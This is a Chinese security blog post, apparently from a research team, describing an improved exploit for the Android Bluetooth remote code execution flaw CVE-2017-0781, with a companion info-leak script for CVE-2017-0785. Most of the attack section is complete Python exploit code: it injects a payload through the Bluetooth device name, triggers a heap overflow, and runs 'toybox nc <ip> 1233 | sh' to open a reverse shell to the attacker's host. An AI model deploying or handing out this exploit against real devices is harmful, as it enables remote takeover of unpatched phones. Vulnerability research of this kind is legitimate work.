<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>Android蓝牙远程命令执行漏洞利用实践 exploit优化 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android蓝牙远程命令执行漏洞利用实践 exploit优化</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android蓝牙远程命令执行漏洞利用实践 exploit优化</h1><div class="post-meta">2017-12-22<span> | </span><span class="category"><a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 2.3k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 9</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="post-content"><p>Author: thor</p>
<p>在上一篇文章<a href="https://xianzhi.aliyun.com/forum/read/2287.html" target="_blank" rel="noopener">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</a>中，我们介绍了Android的蓝牙远程命令执行漏洞CVE-2017-0781的漏洞利用过程，但是exploit还有些缺点，导致exploit成功率不够高。前段时间armis给出了他们的exploit <a href>https://github.com/ArmisSecurity/blueborne</a>，我们赶紧git clone下来学习一波，并结合他们的一些漏洞利用思路，对我们之前的exploit进行了一些优化升级，大大提高了漏洞利用的稳定性和利用成功率。</p>
<h2 id="0x00-测试环境"><a href="#0x00-测试环境" class="headerlink" title="0x00 测试环境"></a>0x00 测试环境</h2><ol>
<li>Android手机: Nexus 6p  </li>
<li>Android系统版本: android 7.0 userdebug</li>
<li>Ubuntu 16 + USB蓝牙适配器</li>
</ol>
<p>为了调试方便，nexus 6p刷了自己编译的AOSP 7.0 userdebug版本，google官方的release版本经测试也是可以成功利用的。</p>
<h2 id="0x01-exploit优化"><a href="#0x01-exploit优化" class="headerlink" title="0x01 exploit优化"></a>0x01 exploit优化</h2><p>我们之前的exploit利用不够稳定主要是因为第一步远程注入payload的时候，我们暂时没有找到稳定的注入方法，只有通过堆喷方式去注入，这就导致payload不能稳定的注入到我们期望的内存地址上。通过研究armis的exploit发现，他们使用了一种比较巧妙的方式注入payload，注入很稳定。armis的方法是将蓝牙适配器的名称改为需要注入的payload，然后再通过蓝牙BNEP协议去连接目标手机，那么目标手机会将请求连接的蓝牙名称缓存到<code>btm_cb.acl_db</code>结构体中，而<code>btm_cb</code>是bluetooth.default.so中的一个全局变量，存放在内存中bluetooth.default.so的bss段，内存地址是可以根据基址和偏移量计算得到的，因此可以稳定的将payload注入到蓝牙进程的一个相对固定的内存地址。</p>
<p><code>btm_cb</code>是<code>tBTM_CB</code>结构体类型，其定义部分内容如下：</p>
<p><img src="/2017/12/22/android-blueborne2/1.png" alt="1"></p>
<p>其中有个<code>tACL_CONN</code>结构体数组，其定义部分内容如下：</p>
<p><img src="/2017/12/22/android-blueborne2/2.png" alt="1"></p>
<p>其中的<code>remote_name</code>成员变量便是我们注入payload的位置。</p>
<p>注入payload主要用到的函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def set_bt_name(payload, src_hci, dst):</span><br><span class="line"></span><br><span class="line"> MAX_BT_NAME &#x3D; 0xf5</span><br><span class="line"> BNEP_PSM &#x3D; 15</span><br><span class="line">	</span><br><span class="line"> # Create raw HCI sock to set our BT name</span><br><span class="line"> raw_sock &#x3D; bt.hci_open_dev(bt.hci_devid(src_hci))</span><br><span class="line"> flt &#x3D; bt.hci_filter_new()</span><br><span class="line"> bt.hci_filter_all_ptypes(flt)</span><br><span class="line"> bt.hci_filter_all_events(flt)</span><br><span class="line"> raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)</span><br><span class="line">	</span><br><span class="line"> # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)</span><br><span class="line"> raw_sock.sendall(binascii.unhexlify(&#39;01130cf8cccccc&#39;) + payload.ljust(MAX_BT_NAME, b&#39;\x00&#39;))</span><br><span class="line"> raw_sock.close()</span><br><span class="line">	 </span><br><span class="line"> time.sleep(0.1)</span><br><span class="line">	</span><br><span class="line"> # Connect to BNEP to &quot;refresh&quot; the name (does auth)</span><br><span class="line"> bnep &#x3D; bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line"> bnep.connect((dst, BNEP_PSM))</span><br><span class="line"> bnep.close()</span><br><span class="line">	</span><br><span class="line"> # Close ACL connection</span><br><span class="line"> os.system(&#39;hcitool dc %s&#39; % (dst,))</span><br></pre></td></tr></table></figure>


<p>其中，payload参数是我们要注入的内容，dst是目标手机的蓝牙MAC地址。</p>
<p>我们将注入的payload设置为：</p>
<pre><code>`payload = struct.pack(&apos;&lt;III&apos;, 0xaaaa1722, 0x41414141, system_addr) + b&apos;&quot;;\n&apos; + b&apos;toybox nc 192.168.2.1 1233 | sh &apos; + b&apos;\n#&apos;`</code></pre><p>运行测试注入脚本，我们通过gdb调试可以看到payload成功注入：</p>
<p><img src="/2017/12/22/android-blueborne2/3.png" alt="1"><br><img src="/2017/12/22/android-blueborne2/15.png" alt="1"></p>
<p>这里有个需要注意的地方就是payload不能包含0x00等坏字符，不然会被截断。</p>
<p>现在我们知道可以将payload注入到<code>btm_cb.acl_db</code>结构体的<code>remote_name</code>变量，且<code>btm_cb</code>是放在bluetooth.default.so的bss段，如下所示：</p>
<p><img src="/2017/12/22/android-blueborne2/4.png" alt="1"></p>
<p>因此，我们只要知道了bluetooth.default.so在内存中加载的bss段基址，那么就可以通过基址加偏移量计算得到<code>remote_name</code>变量在内存中的位置，从而知道payload在内存中的位置。bluetooth.default.so在内存中的相关加载基址是可以通过CVE-2017-0785信息泄露漏洞获取到。</p>
<p>我们优化了注入payload的方式之后，exploit的第二步不变，因此可得到优化版本的exploit脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import bluetooth,time,binascii</span><br><span class="line">from bluetooth import _bluetooth as bt</span><br><span class="line"></span><br><span class="line">libc_base &#x3D; 0xecd3d000</span><br><span class="line">system_addr &#x3D; libc_base + 0x64a30 + 1</span><br><span class="line"></span><br><span class="line">bluetooth_base_addr &#x3D; 0xd11e2000</span><br><span class="line">osi_alloc_addr &#x3D; bluetooth_base_addr + 0x15b885</span><br><span class="line">osi_free_addr &#x3D; bluetooth_base_addr + 0x15b8e5</span><br><span class="line"></span><br><span class="line">bluetooth_default_bss_base &#x3D; 0xd139b000 </span><br><span class="line">acl_name_addr &#x3D;  bluetooth_default_bss_base + 0xc2d24</span><br><span class="line"></span><br><span class="line">def set_bt_name(payload, src_hci, dst):</span><br><span class="line">   </span><br><span class="line">    MAX_BT_NAME &#x3D; 0xf5</span><br><span class="line">    BNEP_PSM &#x3D; 15</span><br><span class="line"></span><br><span class="line">    # Create raw HCI sock to set our BT name</span><br><span class="line">    raw_sock &#x3D; bt.hci_open_dev(bt.hci_devid(src_hci))</span><br><span class="line">    flt &#x3D; bt.hci_filter_new()</span><br><span class="line">    bt.hci_filter_all_ptypes(flt)</span><br><span class="line">    bt.hci_filter_all_events(flt)</span><br><span class="line">    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)</span><br><span class="line"></span><br><span class="line">    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)</span><br><span class="line">    raw_sock.sendall(binascii.unhexlify(&#39;01130cf8cccccc&#39;) + payload.ljust(MAX_BT_NAME, b&#39;\x00&#39;))</span><br><span class="line">    raw_sock.close()</span><br><span class="line"> </span><br><span class="line">    time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">    # Connect to BNEP to &quot;refresh&quot; the name (does auth)</span><br><span class="line">    bnep &#x3D; bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line">    bnep.connect((dst, BNEP_PSM))</span><br><span class="line">    bnep.close()</span><br><span class="line"></span><br><span class="line">    # Close ACL connection</span><br><span class="line">    os.system(&#39;hcitool dc %s&#39; % (dst,))</span><br><span class="line"></span><br><span class="line">def insert_payload(src_hci, target, cmd_str):</span><br><span class="line">       </span><br><span class="line">    payload &#x3D; p32(acl_name_addr+0x20)*2 + &#39;\x01\x01\x01\x01&#39; + p32(system_addr) + p32(acl_name_addr+0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ &#39;\x01&#39;*8 + p32(acl_name_addr+0x28) + cmd_str + b&#39;\n&#39;*(48-len(cmd_str))</span><br><span class="line">		 </span><br><span class="line">    set_bt_name(payload, src_hci, target)</span><br><span class="line"></span><br><span class="line">def heap_overflow(acl_name_addr):</span><br><span class="line"></span><br><span class="line">    pkt2 &#x3D; &#39;\x81\x01\x00&#39;+ p32(acl_name_addr) * 8</span><br><span class="line"></span><br><span class="line">    sock &#x3D; bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line"></span><br><span class="line">    sock.connect((target, 0xf))</span><br><span class="line"></span><br><span class="line">    for i in range(3000):</span><br><span class="line"></span><br><span class="line">		sock.send(pkt2)</span><br><span class="line">		data &#x3D; sock.recv(1024)</span><br><span class="line"></span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">     if len(sys.argv) &lt; 4:</span><br><span class="line">        print &#39;No argvs specified.&#39;</span><br><span class="line">        sys.exit()</span><br><span class="line">     src_hci &#x3D; sys.argv[1]</span><br><span class="line">     target &#x3D; sys.argv[2]</span><br><span class="line">     reverse_shell_ip &#x3D; sys.argv[3]</span><br><span class="line"></span><br><span class="line">     cmd_str &#x3D; b&quot;toybox nc %s 1233 | sh &quot;%(reverse_shell_ip) + b&quot;\n#&quot;</span><br><span class="line">     print &quot;start payload insert  &quot;</span><br><span class="line">     insert_payload(src_hci, target, cmd_str)</span><br><span class="line"></span><br><span class="line">     time.sleep(1)</span><br><span class="line"></span><br><span class="line">     print &quot;start heap overflow &quot;</span><br><span class="line">     heap_overflow(acl_name_addr)</span><br></pre></td></tr></table></figure>

<p>exploit脚本中的那些硬编码的基址是可以通过信息泄露漏洞获取的，而那些硬编码的偏移量则是在libc.so和bluetooth.default.so中找到的，不同机型及系统都需要做适配。<br>exploit脚本测试第一步是在本地机器上运行监听反弹shell的脚本：</p>
<p><img src="/2017/12/22/android-blueborne2/5.png" alt="1"></p>
<p>然后在插上蓝牙适配器的Ubuntu上运行exploit:</p>
<p><img src="/2017/12/22/android-blueborne2/6.png" alt="1"></p>
<p>最后就是静等反弹shell：</p>
<p><img src="/2017/12/22/android-blueborne2/7.png" alt="1"></p>
<p>经过优化后，我们的exploit一般运行1~3次便能成功执行，nice!</p>
<h2 id="0x02-关于CVE-2017-0785信息泄露"><a href="#0x02-关于CVE-2017-0785信息泄露" class="headerlink" title="0x02 关于CVE-2017-0785信息泄露"></a>0x02 关于CVE-2017-0785信息泄露</h2><p>CVE-2017-0785信息泄露漏洞网上分析有很多了，armis的exploit中也有给出他们的信息泄露脚本，这里我也把我们组@heeeeen大牛编写的脚本放出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import bluetooth</span><br><span class="line"></span><br><span class="line">pthread_start_off &#x3D; 0x66a6d</span><br><span class="line">sdp_conn_timer_timeout_off &#x3D; 0x136350</span><br><span class="line"></span><br><span class="line">def packet_leak(service, continuation_state):</span><br><span class="line"></span><br><span class="line">	pkt &#x3D; &#39;\x02\x00\x00&#39;</span><br><span class="line">	pkt +&#x3D; p16(7 + len(continuation_state))</span><br><span class="line">	pkt +&#x3D; &#39;\x35\x03\x19&#39;</span><br><span class="line">	pkt +&#x3D; p16(service)</span><br><span class="line">	pkt +&#x3D; &#39;\x01\x00&#39;</span><br><span class="line">	pkt +&#x3D; continuation_state</span><br><span class="line">	return pkt</span><br><span class="line"></span><br><span class="line">def info_leak(target):</span><br><span class="line"></span><br><span class="line">	service_long &#x3D; 0x0100</span><br><span class="line">	service_short &#x3D; 0x0001</span><br><span class="line">	mtu &#x3D; 50</span><br><span class="line">	n &#x3D; 30</span><br><span class="line"></span><br><span class="line">	sock &#x3D; bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line">	bluetooth.set_l2cap_mtu(sock, mtu)</span><br><span class="line">	context.endian &#x3D; &#39;big&#39;</span><br><span class="line"></span><br><span class="line">	sock.connect((target, 1))</span><br><span class="line"></span><br><span class="line">	sock.send(packet_leak(service_long, &#39;\x00&#39;))</span><br><span class="line">	data &#x3D; sock.recv(mtu)</span><br><span class="line"></span><br><span class="line">	if data[-3] !&#x3D; &#39;\x02&#39;:</span><br><span class="line">	    log.error(&#39;Invalid continuation state received.&#39;)</span><br><span class="line"></span><br><span class="line">	stack &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">	for i in range(1, n):</span><br><span class="line"></span><br><span class="line">	    sock.send(packet_leak(service_short, data[-3:]))</span><br><span class="line">	    data &#x3D; sock.recv(mtu)</span><br><span class="line">	    stack +&#x3D; data[9:-3]</span><br><span class="line">	sock.close()</span><br><span class="line"></span><br><span class="line">	pthread_start_func &#x3D; int(stack[0x0184:0x0188].encode(&#39;hex&#39;),16) </span><br><span class="line"></span><br><span class="line">    libc_base &#x3D; pthread_start_func  -  pthread_start_off</span><br><span class="line">	print &quot;libc.so base address is %s&quot; % hex(libc_base)</span><br><span class="line"></span><br><span class="line">	sdp_conn_timer_timeout_func &#x3D; int(stack[0x0170:0x0174].encode(&#39;hex&#39;),16) </span><br><span class="line"></span><br><span class="line">	bluetooth_base_addr &#x3D; sdp_conn_timer_timeout_func - sdp_conn_timer_timeout_off - 1</span><br><span class="line"></span><br><span class="line">	print &quot;bluetooth.default.so base address is %s&quot; % hex(bluetooth_base_addr)</span><br><span class="line"></span><br><span class="line">	return (libc_base, bluetooth_base_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">       if len(sys.argv) &lt; 2:</span><br><span class="line">          print &#39;No argvs specified.&#39;</span><br><span class="line">          sys.exit()</span><br><span class="line"></span><br><span class="line">       target &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">       info_leak(target)</span><br></pre></td></tr></table></figure>
<p>该脚本主要利用的是泄露的libc.so中<code>pthread_start</code>函数地址找到libc.so的加载基址，利用泄露的<code>sdp_conn_timer_timeout</code>函数地址找到bluetooth.default.so加载基址。需要说明的是，不同机型及系统还是要根据泄露的内容及具体的偏移量修改脚本才行，需要做适配。</p>
<p>运行结果如下所示：</p>
<p><img src="/2017/12/22/android-blueborne2/8.png" alt="1"></p>
<h2 id="0x03-关于armis-exploit的大致分析"><a href="#0x03-关于armis-exploit的大致分析" class="headerlink" title="0x03 关于armis exploit的大致分析"></a>0x03 关于armis exploit的大致分析</h2><p>armis官方给出的exploit主要有两个步骤，第一步是注入payload，第二步则是通过堆溢出去覆盖堆上的某些数据结构的函数指针，从而劫持进程执行。前面我们已经介绍了armis exploit注入payload的方法，现在我们主要介绍下他们劫持进程的思路。我们知道通过<br>CVE-2017-0781的堆溢出可以去覆盖堆上任意结构体的前8个字节，而armis选择了直接溢出只有8个字节大小的<code>list_node_t</code>结构体，其定义如下：</p>
<p><img src="/2017/12/22/android-blueborne2/9.png" alt="1"></p>
<p>该结构体的第二个成员是个void型指针，可以根据用途转化为其他类型的指针，而恰好在<br><code>btu_hci_msg_process</code>函数中会将<code>list_node_t</code>结构体的data成员强制转化为<code>post_to_task_hack_t</code>结构体类型，如下所示：</p>
<p><img src="/2017/12/22/android-blueborne2/10.png" alt="1"><br>而<code>post_to_task_hack_t</code>则包含的是一个函数指针：</p>
<p><img src="/2017/12/22/android-blueborne2/11.png" alt="1"></p>
<p>因此，armis的exploit通过溢出<code>list_node_t</code>结构体可以直接控制堆上的函数指针，从而达到劫持进程执行的目的。<code>list_node_t</code>结构体到<code>p_msg</code>参数的转换则是在<code>btu_hci_msg_ready</code>函数中进行的，如下所示：</p>
<p><img src="/2017/12/22/android-blueborne2/12.png" alt="1"></p>
<p><code>fixed_queue_dequeue</code>函数从队列中出队一个<code>list_node_t</code>结构体，然后转换为<code>p_msg</code>参数传递到<code>btu_hci_msg_process</code>函数进行处理。因此，只要能够控制堆上的<code>list_node_t</code>结构体，就能够在<code>btu_hci_msg_process</code>函数执行时劫持进程。armis的exploit也是通过大量堆喷去实现覆盖<code>list_node_t</code>结构体。</p>
<p>armis的exploit运行结果如下所示：</p>
<p><img src="/2017/12/22/android-blueborne2/13.png" alt="1"></p>
<p>反弹shell如下：</p>
<p><img src="/2017/12/22/android-blueborne2/14.png" alt="1"></p>
<p>armis的exploit在基址和偏移量准确的情况下，成功利用的概率很高，而且十分稳定。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本文介绍了针对CVE-2017-0781的exploit优化思路及过程，提高了稳定性及成功率。我们也尝试了在release版本的手机上进行测试，目前暂时只在nexus 6p + google工厂镜像上测试成功，在其他机型上暂未成功。由于不同oem厂商对系统均有所改动，且release版本手机不好调试及找寻找符号偏移量，所以适配工作还是有一定难度，大规模通杀的exploit更是难上加难。</p>
<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p>[1] <a href>https://github.com/ArmisSecurity/blueborne</a></p>
</div><div class="tags"><a href="/tags/Android/"><i class="fa fa-tag"></i>Android</a></div><div class="post-nav"><a class="pre" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a><a class="next" href="/2017/11/14/blueborne/">Android蓝牙远程命令执行漏洞利用实践:从PoC到exploit</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">审计工具</a> <a href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意程序</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/IOS/" style="font-size: 15px;">IOS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/testtest/">testtest</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Collect-login-credentials/">linux后渗透之收集登录凭证</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Intranet-penetration/">内网渗透之内网穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/19/Java-Debug/">Java无源码调试之英雄崛起</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>